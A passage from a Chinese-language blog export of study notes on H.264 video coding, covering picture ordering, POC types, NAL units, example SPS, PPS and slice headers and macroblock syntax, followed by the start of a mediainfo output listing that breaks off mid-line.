<img data-src="/images/Media/H264-picture-orders.png" class="" width="550" height="360" title="Picture Orders">

<p>三种图片（picture）顺序</p>
<ul>
<li><code>DecodingOrder</code>：从bitstream中解码图片的顺序</li>
<li><code>DisplayOrder</code>：图片输出到显示器中的顺序</li>
<li><code>ReferenceOrder</code>：供其他图片进行帧间预测时图片排列的顺序<ul>
<li>解码<code>P slice</code>时用一个有序列表即可</li>
<li>解码<code>B slice</code>时用两个表示不同方向的有序列表</li>
</ul>
</li>
</ul>
<p><a href="https://www.vcodex.com/h264avc-picture-management">H.264&#x2F;AVC Picture Management</a></p>
<h3 id="Decoding-Order"><a href="#Decoding-Order" class="headerlink" title="Decoding Order"></a>Decoding Order</h3><p><a href="https://www.ramugedia.com/frame-num-is-not-frame-counter">frame_num is not frame counter - benefits and rationale</a></p>
<p>由<code>SliceHeader</code>中的<code>frame_num</code>参数决定AU的解码顺序，其变化规律为：</p>
<ul>
<li>遇到IDR帧时，重置为0</li>
<li>遇到引用帧（I&#x2F;P）时，累加1</li>
<li>遇到非引用帧（B）时，保持不变</li>
</ul>
<p>$I_0 \text{  } P_1 \text{  } B_2 \text{  } B_2 \text{  } P_2 \text{  } P_3$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SliceHeader.frame_num:</span><br><span class="line">  if IDR:</span><br><span class="line">    frame_num = 0</span><br><span class="line">  if referenceFrame:</span><br><span class="line">    frame_num += 1</span><br></pre></td></tr></table></figure>

<h3 id="Display-Order"><a href="#Display-Order" class="headerlink" title="Display Order"></a>Display Order</h3><p>由POC (Picture Order Count)参数决定<code>decoded frames</code>的显示顺序，其变化规律：</p>
<ul>
<li>遇到IDR帧时，重置为0</li>
<li>POC分为高位（POC_MSB）和低位（POC_LSB）</li>
<li>每一帧（有顶场和底场）的POC增量（delta）为2</li>
<li><code>SliceHeader</code>中的<code>TopFieldOrderCount</code>和<code>BottomFieldOrderCount</code>参数从POC换算得到（三种方法）</li>
</ul>
<h4 id="Type-0"><a href="#Type-0" class="headerlink" title="Type 0"></a><code>Type 0</code></h4><p>POC的最低有效位在每个<code>slice header</code>中都携带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SliceHeader.POC:</span><br><span class="line">  if IDR:</span><br><span class="line">    POC_MSB = POC_LSB = 0</span><br><span class="line">  if POC_LSB to MAX_VALUE:</span><br><span class="line">    POC_MSB += 1</span><br><span class="line">    POC_LSB = 0</span><br><span class="line">  if FRAME:</span><br><span class="line">    POC_LSB += 2</span><br><span class="line">  TopFieldOrderCount = POC_MSB + POC_LSB</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">Slice</th>
<th align="left">Type</th>
<th align="left">Used for reference</th>
<th align="left">frame num</th>
<th align="left">POC LSBs</th>
<th align="left">Display order</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1st</td>
<td align="left">I</td>
<td align="left">Yes</td>
<td align="left">0</td>
<td align="left">0</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">2nd</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">1</td>
<td align="left">4</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">3rd</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">2</td>
<td align="left">2</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">4th</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">2</td>
<td align="left">8</td>
<td align="left">4</td>
</tr>
<tr>
<td align="left">5th</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">3</td>
<td align="left">6</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">6th</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">3</td>
<td align="left">12</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">7th</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">4</td>
<td align="left">10</td>
<td align="left">5</td>
</tr>
<tr>
<td align="left">8th</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">4</td>
<td align="left">16</td>
<td align="left">8</td>
</tr>
</tbody></table>
<ul>
<li>$I_1 \text{  } P_2 \text{  } B_3 \text{  } P_4 \text{  } B_5 \text{  } P_6 \text{  } B_7 \text{  } P_8$ (AU的传输顺序&#x2F;Slice编号)</li>
<li>$I_0 \text{  } P_4 \text{  } B_2 \text{  } P_8 \text{  } B_6 \text{  } P_{12} \text{  } B_{10} \text{  } P_{16}$ (POC_LSB值，决定显示顺序)</li>
<li>显示顺序为：$IBPBPBPBPB…$</li>
</ul>
<img data-src="/images/Media/H264-display-order-type-0.png" class="" width="700" height="205" title="Example: picture orders for type 0">

<h4 id="Type-1"><a href="#Type-1" class="headerlink" title="Type 1"></a><code>Type 1</code></h4><p>在SPS中携带POC增量：delta_pic_order_cnt[0] &#x3D; 2<br>上一个参考帧和下一个参考帧的偏移量：offset_for_next_ref_frame &#x3D; +6<br>上一个参考帧和下一个非参考帧的偏移量：offset_for_non_ref_pic &#x3D; -4</p>
<table>
<thead>
<tr>
<th align="left">Slice</th>
<th align="left">Type</th>
<th align="left">Used for reference</th>
<th align="left">frame num</th>
<th align="left">Delta POC</th>
<th align="left">Offset</th>
<th align="left">POC</th>
<th align="left">Display order</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1st</td>
<td align="left">I</td>
<td align="left">Yes</td>
<td align="left">0</td>
<td align="left">0</td>
<td align="left">0</td>
<td align="left">0</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">2nd</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">1</td>
<td align="left">0</td>
<td align="left">+6</td>
<td align="left">6</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">3rd</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">2</td>
<td align="left">0</td>
<td align="left">−4</td>
<td align="left">2</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">4th</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">2</td>
<td align="left">2</td>
<td align="left">−4+2</td>
<td align="left">4</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">5th</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">2</td>
<td align="left">0</td>
<td align="left">+6</td>
<td align="left">12</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">6th</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">3</td>
<td align="left">0</td>
<td align="left">−4</td>
<td align="left">8</td>
<td align="left">4</td>
</tr>
<tr>
<td align="left">7th</td>
<td align="left">B</td>
<td align="left">No</td>
<td align="left">3</td>
<td align="left">2</td>
<td align="left">−4+2</td>
<td align="left">10</td>
<td align="left">5</td>
</tr>
<tr>
<td align="left">8th</td>
<td align="left">P</td>
<td align="left">Yes</td>
<td align="left">3</td>
<td align="left">0</td>
<td align="left">+6</td>
<td align="left">18</td>
<td align="left">9</td>
</tr>
</tbody></table>
<ul>
<li>第4和第7个slice头部携带了POC增量</li>
<li>显示顺序为：$IBBPBBPBBP…$</li>
</ul>
<img data-src="/images/Media/H264-display-order-type-1.png" class="" width="700" height="205" title="Example: picture orders for type 1">

<h4 id="Type-2"><a href="#Type-2" class="headerlink" title="Type 2"></a><code>Type 2</code></h4><p>POC直接从<code>frame_num</code>中派生，此时DisplayOrder与DecodingOrder一致</p>
<h1 id="NAL"><a href="#NAL" class="headerlink" title="NAL"></a>NAL</h1><p>NAULs (Network Abstraction Layer Units)是存储或传输编码的H264数据的包。</p>
<table>
<thead>
<tr>
<th align="left">Header</th>
<th align="left">NAL Unit</th>
<th align="left">VCL</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">01 &#x3D; 61&amp;1F</td>
<td align="left">Coded slice, non-IDR</td>
<td align="left">Yes</td>
<td align="left">A typical coded slice</td>
</tr>
<tr>
<td align="left">02 &#x3D; 62&amp;1F</td>
<td align="left">Coded slice data partition A</td>
<td align="left">Yes</td>
<td align="left">Part of a data partitioned slice</td>
</tr>
<tr>
<td align="left">03 &#x3D; 63&amp;1F</td>
<td align="left">Coded slice data partition B</td>
<td align="left">Yes</td>
<td align="left">Part of a data partitioned slice</td>
</tr>
<tr>
<td align="left">04 &#x3D; 64&amp;1F</td>
<td align="left">Coded slice data partition C</td>
<td align="left">Yes</td>
<td align="left">Part of a data partitioned slice</td>
</tr>
<tr>
<td align="left">05 &#x3D; 65&amp;1F</td>
<td align="left">Coded slice, IDR</td>
<td align="left">Yes</td>
<td align="left">Part of the Access Unit at the start of a coded video sequence</td>
</tr>
<tr>
<td align="left">06 &#x3D; 66&amp;1F</td>
<td align="left">SEI</td>
<td align="left">No</td>
<td align="left">Supplemental Enhancement Information</td>
</tr>
<tr>
<td align="left">07 &#x3D; 67&amp;1F</td>
<td align="left">SPS</td>
<td align="left">No</td>
<td align="left">Sequence Parameter Set, one per sequence</td>
</tr>
<tr>
<td align="left">08 &#x3D; 68&amp;1F</td>
<td align="left">PPS</td>
<td align="left">No</td>
<td align="left">Picture Parameter Set</td>
</tr>
<tr>
<td align="left">09 &#x3D; 69&amp;1F</td>
<td align="left">Access unit delimiter</td>
<td align="left">No</td>
<td align="left">Indicates type of the slices in the next coded picture (optional)</td>
</tr>
<tr>
<td align="left">10 &#x3D; 10&amp;1F</td>
<td align="left">End of sequence</td>
<td align="left">No</td>
<td align="left">Indicates that the next access unit is IDR (optional)</td>
</tr>
<tr>
<td align="left">11 &#x3D; 11&amp;1F</td>
<td align="left">End of stream</td>
<td align="left">No</td>
<td align="left">Indicates the end of the coded bitstream (optional)</td>
</tr>
<tr>
<td align="left">12 &#x3D; 12&amp;1F</td>
<td align="left">Filler</td>
<td align="left">No</td>
<td align="left">Filler bytes (optional)</td>
</tr>
</tbody></table>
<h2 id="SPS"><a href="#SPS" class="headerlink" title="SPS"></a>SPS</h2><p><strong>Example: A SPS for a Baseline Profile, QCIF coded sequence</strong></p>
<table>
<thead>
<tr>
<th align="left">Parameter</th>
<th align="right">Binary code</th>
<th align="right">Symbol</th>
<th align="left">Discussion</th>
</tr>
</thead>
<tbody><tr>
<td align="left">profile_idc</td>
<td align="right">1000010</td>
<td align="right">66</td>
<td align="left">Baseline Profile</td>
</tr>
<tr>
<td align="left">constrained_set0_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Bistream might not obey all the constraints of the Baseline Profile</td>
</tr>
<tr>
<td align="left">constrained_set1_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">As above, Main Profile</td>
</tr>
<tr>
<td align="left">constrained_set2_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">As above, Extended Profile</td>
</tr>
<tr>
<td align="left">constrained_set3_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Used to specify the special case of Level 1b</td>
</tr>
<tr>
<td align="left">reserved_zero_4bits</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Not used</td>
</tr>
<tr>
<td align="left">level_idc</td>
<td align="right">11110</td>
<td align="right">30</td>
<td align="left">Level 3</td>
</tr>
<tr>
<td align="left">seq_parameter_set_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Sequence Parameter Set 0</td>
</tr>
<tr>
<td align="left">log2_max_frame_num_minus4</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">frame num will not exceed 16.</td>
</tr>
<tr>
<td align="left">pic_order_cnt_type</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Default POC</td>
</tr>
<tr>
<td align="left">log2_max_pic_order_cnt_lsb_minus4</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">LSB of POC will not exceed 16.</td>
</tr>
<tr>
<td align="left">num_ref_frames</td>
<td align="right">1011</td>
<td align="right">10</td>
<td align="left">Up to 10 reference frames.</td>
</tr>
<tr>
<td align="left">gaps_in_frame_num_value_allowed_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">No gaps in frame num.</td>
</tr>
<tr>
<td align="left">pic_width_in_mbs_minus1</td>
<td align="right">1011</td>
<td align="right">10</td>
<td align="left">11 macroblocks wide &#x3D; QCIF</td>
</tr>
<tr>
<td align="left">pic_height_in_map_units_minus1</td>
<td align="right">1001</td>
<td align="right">8</td>
<td align="left">9 MBs high &#x3D; QCIF</td>
</tr>
<tr>
<td align="left">frame_mbs_only_flag</td>
<td align="right">1</td>
<td align="right">1</td>
<td align="left">No field slices or field MBs</td>
</tr>
<tr>
<td align="left">direct_8×8_inference_flag</td>
<td align="right">1</td>
<td align="right">1</td>
<td align="left">Specifies how certain B macroblock motion vectors are derived</td>
</tr>
<tr>
<td align="left">frame_cropping_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Frames are not cropped</td>
</tr>
<tr>
<td align="left">vui_parameters_present_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">VUI parameters not present</td>
</tr>
</tbody></table>
<ul>
<li>SPS对于正确的解码视频序列至关重要，包括Profile和Level、视频帧的大小、参考帧的数量等</li>
<li>seq_parameter_set_id是SPS的唯一标识</li>
<li>帧宽：(pic_width_in_mbs_minus1 + 1) * mb_width &#x3D; (10 + 1) * 16 &#x3D; 176</li>
<li>帧高：(pic_height_in_map_units_minus1) * mb_height &#x3D; (8 + 1) * 16 &#x3D; 144</li>
</ul>
<h2 id="PPS"><a href="#PPS" class="headerlink" title="PPS"></a>PPS</h2><p><strong>Example: A PPS</strong></p>
<table>
<thead>
<tr>
<th align="left">Parameter</th>
<th align="right">Binary code</th>
<th align="right">Symbol</th>
<th align="left">Discussion</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pic_parameter_set_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Picture Parameter Set  0</td>
</tr>
<tr>
<td align="left">seq_parameter_set_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Use SPS 0</td>
</tr>
<tr>
<td align="left">entropy_coding_mode_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">CAVLC entropy coding</td>
</tr>
<tr>
<td align="left">pic_order_present_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">POC not present</td>
</tr>
<tr>
<td align="left">num_slice_groups_minus1</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">One slice group</td>
</tr>
<tr>
<td align="left">num_ref_idx_l0_active_minus1</td>
<td align="right">1010</td>
<td align="right">9</td>
<td align="left">10 reference pictures in  list0</td>
</tr>
<tr>
<td align="left">num_ref_idx_l1_active_minus1</td>
<td align="right">1010</td>
<td align="right">9</td>
<td align="left">10 reference pictures in  list1</td>
</tr>
<tr>
<td align="left">weighted_pred_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Weighted prediction not used</td>
</tr>
<tr>
<td align="left">weighted_bipred_idc</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Weighted biprediction not used</td>
</tr>
<tr>
<td align="left">pic_init_qp_minus26</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Initial QP (luma) &#x3D; 26</td>
</tr>
<tr>
<td align="left">pic_init_qs_minus26</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Initial SI&#x2F;SP QP &#x3D; 26</td>
</tr>
<tr>
<td align="left">chroma_qp_index_offset</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">No chroma QP offset</td>
</tr>
<tr>
<td align="left">deblocking_filter_control_present_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Use default filter  parameters</td>
</tr>
<tr>
<td align="left">constrained_intra_pred_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Intra prediction is not constrained</td>
</tr>
<tr>
<td align="left">redundant_pic_cnt_present_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Redundant picture count parameter  is not used</td>
</tr>
</tbody></table>
<ul>
<li>PPS包含编码帧序列的公共参数，例如熵编码类型、初始化参数等</li>
<li>pic_parameter_set_id是PPS的唯一标识</li>
<li>seq_parameter_set_id指PPS继承自哪个SPS。在解码过程中，通过此关系联动激活SPS。</li>
</ul>
<h1 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h1><p>每个编码的frame或field，均由一个或多个slice组成，每个slice由header后跟随整数个macroblocks组成，可能的场景：</p>
<ul>
<li>每个编码的picture只由一个slice组成（常见做法）</li>
<li>每个编码的picture由N个slice组成，每个slice由M个macroblock组成<ul>
<li>slice包含的字节大小会随着picture中motion和detail的变化而变化</li>
</ul>
</li>
<li>每个编码的picture由N个slice组成，每个slice可包含不同数量的macroblock，以使slice包含的字节大小大致不变<ul>
<li>适合每个slice映射到固定大小的网络包的场景</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Slice type</th>
<th align="left">Contains MB types</th>
<th align="left">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">I (including IDR)</td>
<td align="left">I only</td>
<td align="left">Intra prediction only.</td>
</tr>
<tr>
<td align="left">P</td>
<td align="left">I and&#x2F;or P</td>
<td align="left">Intra prediction (I) and&#x2F;or pred from one-ref per MB partition (P).</td>
</tr>
<tr>
<td align="left">B</td>
<td align="left">I, P and&#x2F;or B</td>
<td align="left">Intra prediction (I), pred from one-refer (P) or bipred from two-refers (B)</td>
</tr>
<tr>
<td align="left">SP</td>
<td align="left">P and&#x2F;or I</td>
<td align="left">Switching P slice</td>
</tr>
<tr>
<td align="left">SI</td>
<td align="left">SI</td>
<td align="left">Switching I slice</td>
</tr>
</tbody></table>
<ul>
<li>slice的类型决定了允许出现在其内的macroblock类型</li>
</ul>
<p><strong>Example (Frame 0): Header from an I (IDR) slice with frame_mbs_only_flag&#x3D;1 (no field coding)</strong></p>
<table>
<thead>
<tr>
<th align="left">Slice Header Parameter</th>
<th align="right">Binary code</th>
<th align="right">Symbol</th>
<th align="left">Discussion</th>
</tr>
</thead>
<tbody><tr>
<td align="left">first_mb_in_slice</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">First MB is at pos 0, the top-left pos in the slice.</td>
</tr>
<tr>
<td align="left">slice_type</td>
<td align="right">1000</td>
<td align="right">7</td>
<td align="left">I slice, contains only I MBs</td>
</tr>
<tr>
<td align="left">pic_parameter_set_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Use PPS 0</td>
</tr>
<tr>
<td align="left">frame_num</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Slice is in frame 0</td>
</tr>
<tr>
<td align="left">idr_pic_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">IDR #0: only present in IDR picture</td>
</tr>
<tr>
<td align="left">pic_order_cnt_lsb</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Picture order count &#x3D; 0</td>
</tr>
<tr>
<td align="left">no_output_of_prior_pics_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Not used</td>
</tr>
<tr>
<td align="left">long_term_reference_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Not used</td>
</tr>
<tr>
<td align="left">slice_qp_delta</td>
<td align="right">1000</td>
<td align="right">4</td>
<td align="left">QP &#x3D; initial QP + 4 &#x3D; 26 + 4 &#x3D; 30</td>
</tr>
</tbody></table>
<ul>
<li>slice头包括了其内的所有macroblocks公共的信息，例如slice类型、slice对应的frame编号等</li>
</ul>
<p><strong>Example (Frame 1): Header from an P slice with picture_order_count(POC)&#x3D;2</strong></p>
<table>
<thead>
<tr>
<th align="left">Parameter</th>
<th align="right">Binary code</th>
<th align="right">Symbol</th>
<th align="left">Discussion</th>
</tr>
</thead>
<tbody><tr>
<td align="left">first_mb_in_slice</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">First MB at position 0</td>
</tr>
<tr>
<td align="left">slice_type</td>
<td align="right">110</td>
<td align="right">5</td>
<td align="left">P slice, can contain I or P MBs</td>
</tr>
<tr>
<td align="left">pic_parameter_set_id</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">Use PPS 0</td>
</tr>
<tr>
<td align="left">frame_num</td>
<td align="right">1</td>
<td align="right">1</td>
<td align="left">Frame 1</td>
</tr>
<tr>
<td align="left">pic_order_cnt_lsb</td>
<td align="right">10</td>
<td align="right">2</td>
<td align="left">Picture 2</td>
</tr>
<tr>
<td align="left">num_ref_idx_active_override_flag</td>
<td align="right">1</td>
<td align="right">1</td>
<td align="left">Default number of ref-pictures overridden by following parameter</td>
</tr>
<tr>
<td align="left">num_ref_idx_l0_active_minus1</td>
<td align="right">1</td>
<td align="right">0</td>
<td align="left">One reference picture in List 0</td>
</tr>
<tr>
<td align="left">ref_pic_list_reordering_flag_l0</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">No re-ordering of reference pictures</td>
</tr>
<tr>
<td align="left">adaptive_ref_pic_buffering_flag</td>
<td align="right">0</td>
<td align="right">0</td>
<td align="left">Ref-pictures handled as ‘first in&#x2F;first out’ (default)</td>
</tr>
<tr>
<td align="left">slice_qp_delta</td>
<td align="right">1000</td>
<td align="right">4</td>
<td align="left">QP &#x3D; 26 + 4 &#x3D; 30</td>
</tr>
</tbody></table>
<ul>
<li>pic_parameter_set_id指slice使用哪个PPS参数。在解码过程中，通过此关系联动激活PPS</li>
<li>num_ref_idx_l0_active_minus1标识在DPB的<em>List 0</em>有一个参考picture (Frame 0)</li>
</ul>
<p><em>P, SP or B slice</em>包含的MB中可能会出现*skip macroblock (containing no data)*：</p>
<ul>
<li>mb_skip_run标识CAVLC熵编码模式中<em>skipped macroblocks</em>的计数</li>
<li>mb_skip_flag标识CABAC熵编码模式中有一个<em>skipped macroblock</em></li>
</ul>
<h1 id="Macroblock"><a href="#Macroblock" class="headerlink" title="Macroblock"></a>Macroblock</h1><pre class="mermaid">
stateDiagram-v2
direction TB
[*] --&gt; mb_type
mb_type --&gt; transform_size_8x8_flag
mb_type --&gt; sub_mb_pred
transform_size_8x8_flag --&gt; mb_pred
mb_pred --&gt; coded_block_pattern
sub_mb_pred --&gt; coded_block_pattern
coded_block_pattern --&gt; transform_size_8x8_flag_(optional)
transform_size_8x8_flag_(optional) --&gt; delta_qp
delta_qp --&gt; residual
residual --&gt; [*]
note left of transform_size_8x8_flag
  (optional) High Profile only
end note
note right of mb_pred
  Not P&#x2F;B_8x8
end note
note right of sub_mb_pred
  P&#x2F;B_8x8
end note
note right of coded_block_pattern
  (optional) Not Intra_16x16 only
end note
note left of residual
  (optional) If present
end note
</pre>

<ul>
<li><strong>mb_type</strong>标识macroblock类型、prediction信息和coding信息<table>
  <thead>
    <tr>
      <th>MB coding type</th>
      <th>Info signalled in mb_type</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td rowspan=4>I</td>
      <td>4×4</td>
      <td>indicates 4×4 Intra prediction mode.</td>
    </tr>
    <tr>
      <td>8×8</td>
      <td>indicates 8×8 Intra prediction mode.</td>
    </tr>
    <tr>
      <td>16×16</td>
      <td>
      indicates 16×16 Intra prediction mode;
      luma and chroma coded block pattern is also indicated by mb_type.
      </td>
    </tr>
    <tr>
      <td>PCM</td>
      <td>indicates that the special PCM mode is used.</td>
    </tr>
    <tr>
      <td rowspan=1>SI</td>
      <td>None</td>
      <td>None</td>
    </tr>
    <tr>
      <td rowspan=5>P</td>
      <td>16×16</td>
      <td rowspan=3>indicates partition size.</td>
    </tr>
    <tr>
      <td>16×8</td>
    </tr>
    <tr>
      <td>8×16</td>
    </tr>
    <tr>
      <td>8×8</td>
      <td>indicates 8×8 partition size, a further syntax element sub_mb_type and optionally a reference index are also transmitted.</td>
    </tr>
    <tr>
      <td>P_Skip (inferred)</td>
      <td>indicates Skip mode, no further data transmitted.</td>
    </tr>
    <tr>
      <td rowspan=5>B</td>
      <td>16×16</td>
      <td>
      indicates 16×16 partition size. Prediction mode may be Direct,
      no motion vectors or references transmitted, Pred, 
      prediction from one reference picture in list 0 or list 1, or BiPred, 
      prediction from two references, one from list 0 and one from list 1.
      </td>
    </tr>
    <tr>
      <td>16×8</td>
      <td>indicates 16×8 partition size plus prediction modes of each partition, either Pred from L0, Pred from L1 or BiPred.</td>
    </tr>
    <tr>
      <td>8×16</td>
      <td>indicates 8×16 partition size plus prediction modes of each partition, Pred from L0 or L1, or BiPred.</td>
    </tr>
    <tr>
      <td>8×8</td>
      <td>indicates 8×8 partition size. A further syntax element sub_mb_type is sent for each 8×8 partition.</td>
    </tr>
    <tr>
      <td>B_Skip (inferred)</td>
      <td>indicates Skip mode, no further data transmitted.</td>
    </tr>
  </tbody>
</table>
- I (macroblock)可以出现在任何slice类型中，而且不需要参考其他的slice
- SI (SIntra MB)只出现在switching或SI类型的slice中
- P (macroblock)可以出现在P或SP类型的slice中，且在帧间预测时需要一个参考
- B (BiPredicted macroblock)可以出现在B类型的slice中，且在帧间预测时需要两个参考</li>
<li><strong>transform_size_8×8_flag</strong>标识在HighProfile字节流中，对luma块使用8x8代替默认的4x4整数变换，此标记不会出现在16x16的帧内编码中</li>
<li><strong>mb_pred</strong>表示非8x8的P&#x2F;B宏块在帧内或帧间预测时的类型</li>
<li><strong>sub_mb_pred</strong>表示8x8的P&#x2F;B宏块在帧内或帧间预测时的类型</li>
<li><strong>coded_block_pattern</strong>出现在非intra_16x16类型的宏块中，是宏块内出现非零系数的十进制表示，取值范围为[0, 47]</li>
<li><strong>delta_qp</strong>表示量化参数（QP）与之前的值相比的增量（正或负）</li>
<li><strong>residual_data</strong>表示残差数据</li>
</ul>
<h2 id="Intra-PCM"><a href="#Intra-PCM" class="headerlink" title="Intra_PCM"></a>Intra_PCM</h2><p>Intra_PCM (Pulse Code Modulation) 是编码macroblock的可选模式，由mb_type中的I_PCM标识，此模式下通常的prediction、transform和coding过程被绕过，直接传输每个luma和chroma样本：</p>
<ul>
<li>字节流按byte对齐，缺少的bit位置补0</li>
<li>默认BitDepth为8, 每个样本1byte。在SPS中可设置更高的位深</li>
<li>每256个luma样本作为一个独立的$BitDepth_Y\text{-}bit$值，表示未压缩luma样本的bit数量</li>
<li>每64个4:2:0采样的chroma样本作为一个独立的$BitDepth_C\text{-}bit$值，表示未压缩chroma样本的bit数量</li>
</ul>
<p>备注：</p>
<ul>
<li>适用需要编码很高的感知质量（very low QP）的场景。此时，经过预测、变换和熵编码后的bit数量可能会比未压缩视频更多</li>
<li>I_PCM模式下，H264字节流等同于未压缩视频的容器，此时在保留原始视频的同时，也可利用H264中的特性，例如包处理、帧编号和传输支持</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="#">THE H.264 ADVANCED VIDEO COMPRESSION STANDARD, Second Edition, 2010, Iain E. Richardson</a></p>
]]></content>
      <categories>
        <category>Media</category>
        <category>H264</category>
      </categories>
      <tags>
        <tag>H264</tag>
      </tags>
  </entry>
  <entry>
    <title>mediainfo视频信息</title>
    <url>/Media/Mediainfo.html</url>
    <content><![CDATA[<p>mediainfo功能梳理。</p>
<span id="more"></span>

<h1 id="检查流"><a href="#检查流" class="headerlink" title="检查流"></a>检查流</h1><div class="tabs" id="mediainfo-basic"><ul class="nav-tabs"><li class="tab active"><a href="#mediainfo-basic-1">基本信息</a></li><li class="tab"><a href="#mediainfo-basic-2">slice列表</a></li><li class="tab"><a href="#mediainfo-basic-3">slice数量</a></li></ul><div class="tab-content"><div class="tab-pane active" id="mediainfo-basic-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mediainfo 1.mp4</span><br><span class="line">General</span><br><span class="line">Complete name                            : 1.mp4</span><br><span class="line">Format                                   : MPEG-4</span><br><span class="line">Format profile                           : Base Media</span><br><span class="line">Codec ID                                 : isom (isom/iso2/avc1/mp41)</span><br><span class="line">File size                                : 74.8 MiB</span><br><span class="line">Duration                                 : 1 min 1 s</span><br><span class="line">Overall bit rate mode                    : Constant</span><br><span class="line">Overall bit rate                         : 10.3 Mb/s</span><br><span class="line">Writing application                      : Lavf58.29.100</span><br><span class="line"></span><br><span class="line">Video</span><br><span class="line">ID                                       : 1</span><br><span class="line">Format                                   : AVC</span><br><span class="line">Format/Info                              : Advanced Video Codec</span><br><span class="line">Format profile                           : High@L4.2</span><br><span class="line">Format settings                          : CABAC / 4 Ref Frames</span><br><span class="line">Format settings, CABAC                   : Yes</span><br><span class="line">Format settings, Reference frames        : 4 frames</span><br><span class="line">Codec ID                                 : avc1</span><br><span class="line">Codec ID/Info                            : Advanced Video Coding</span><br><span class="line">Duration                                 : 1 min 1 s</span><br><span class="line">Bit rate mode                            : Constant</span><br><span class="line">Bit rate                                 : 10 000 kb/s</span><br><span class="line">Width                                    : 1 920 pixels</span><br><span class="line">Height                                   : 1 080 pixels</span><br><span class="line">Display aspect ratio                     : 16:9</span><br><span class="line">Frame rate mode                          : Variable</span><br><span class="line">Frame rate                               : 60.000 FPS</span><br><span class="line">Minimum frame rate                       : 58.824 FPS</span><br><span class="line">Maximum frame rate                       : 62.500 FPS</span><br><span class="line">Color space                              : YUV</span><br><span class="line">Chroma subsampling                       : 4:2:0</span><br><span class="line">Bit depth                                : 8 bits</span><br><span class="line">Scan type                                : Progressive</span><br><span class="line">Bits/(Pixel*Frame)                       : 0.080</span><br><span class="line">Stream size                              : 72.9 MiB (97%)</span><br><span class="line">Color range                              : Limited</span><br><span class="line">Color primaries                          : BT.709</span><br><span class="line">Transfer characteristics                 : BT.709</span><br><span class="line">Matrix coefficients                      : BT.709</span><br><span class="line">Codec configuration box                  : avcC</span><br><span class="line"></span><br><span class="line">Audio</span><br><span class="line">ID                                       : 2</span><br><span class="line">Format                                   : AAC LC</span><br><span class="line">Format/Info                              : Advanced Audio Codec Low Complexity</span><br><span class="line">Codec ID                                 : mp4a-40-2</span><br><span class="line">Duration                                 : 1 min 1 s</span><br><span class="line">Bit rate mode                            : Constant</span><br><span 